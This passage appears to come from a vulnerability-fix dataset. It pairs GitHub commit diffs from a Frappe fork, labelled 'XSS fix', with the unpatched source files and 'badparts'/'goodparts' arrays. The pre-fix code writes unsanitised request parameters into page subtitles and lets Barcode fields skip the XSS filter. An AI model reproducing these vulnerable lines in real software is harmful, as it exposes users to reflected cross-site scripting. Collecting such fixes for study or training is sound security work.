\"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n"
                }
            },
            "msg": "fix(blog): Fix possible reflected XSS attack vector"
        }
    },
    "https://github.com/kitechx/frappe": {
        "2fa19c25066ed17478d683666895e3266936aee6": {
            "url": "https://api.github.com/repos/kitechx/frappe/commits/2fa19c25066ed17478d683666895e3266936aee6",
            "html_url": "https://github.com/kitechx/frappe/commit/2fa19c25066ed17478d683666895e3266936aee6",
            "sha": "2fa19c25066ed17478d683666895e3266936aee6",
            "keyword": "XSS fix",
            "diff": "diff --git a/frappe/website/doctype/blog_post/blog_post.py b/frappe/website/doctype/blog_post/blog_post.py\nindex a20e9fa12..e4c757e64 100644\n--- a/frappe/website/doctype/blog_post/blog_post.py\n+++ b/frappe/website/doctype/blog_post/blog_post.py\n@@ -7,7 +7,7 @@\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n@@ -95,7 +95,7 @@ def get_list_context(context=None):\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n@@ -107,7 +107,7 @@ def get_list_context(context=None):\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n",
            "message": "",
            "files": {
                "/frappe/website/doctype/blog_post/blog_post.py": {
                    "changes": [
                        {
                            "diff": "\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown"
                            ],
                            "goodparts": [
                                "from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html"
                            ]
                        },
                        {
                            "diff": "\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category"
                            ],
                            "goodparts": [
                                "\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)"
                            ]
                        },
                        {
                            "diff": "\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/website/doctype/blog_post/blog_post.py",
                            "badparts": [
                                "\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)"
                            ],
                            "goodparts": [
                                "\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))"
                            ]
                        }
                    ],
                    "source": "\n from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts ",
                    "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n"
                }
            },
            "msg": "fix(blog): Fix possible reflected XSS attack vector"
        },
        "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37": {
            "url": "https://api.github.com/repos/kitechx/frappe/commits/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37",
            "html_url": "https://github.com/kitechx/frappe/commit/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37",
            "sha": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37",
            "keyword": "XSS fix",
            "diff": "diff --git a/frappe/core/doctype/doctype/doctype.py b/frappe/core/doctype/doctype/doctype.py\nindex a06a33df1..fedb605ad 100644\n--- a/frappe/core/doctype/doctype/doctype.py\n+++ b/frappe/core/doctype/doctype/doctype.py\n@@ -715,7 +715,6 @@ def scrub_fetch_from(field):\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n \ndiff --git a/frappe/model/base_document.py b/frappe/model/base_document.py\nindex 922557fee..982c54c3a 100644\n--- a/frappe/model/base_document.py\n+++ b/frappe/model/base_document.py\n@@ -627,7 +627,7 @@ def _sanitize_content(self):\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n",
            "message": "",
            "files": {
                "/frappe/core/doctype/doctype/doctype.py": {
                    "changes": [
                        {
                            "diff": "\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n ",
                            "add": 0,
                            "remove": 1,
                            "filename": "/frappe/core/doctype/doctype/doctype.py",
                            "badparts": [
                                "\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1"
                            ],
                            "goodparts": []
                        }
                    ]
                },
                "/frappe/model/base_document.py": {
                    "changes": [
                        {
                            "diff": "\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/frappe/model/base_document.py",
                            "badparts": [
                                "\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")"
                            ],
                            "goodparts": [
                                "\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")"
                            ]
                        }
                    ],
                    "source": "\n from __future__ import unicode_literals from six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", 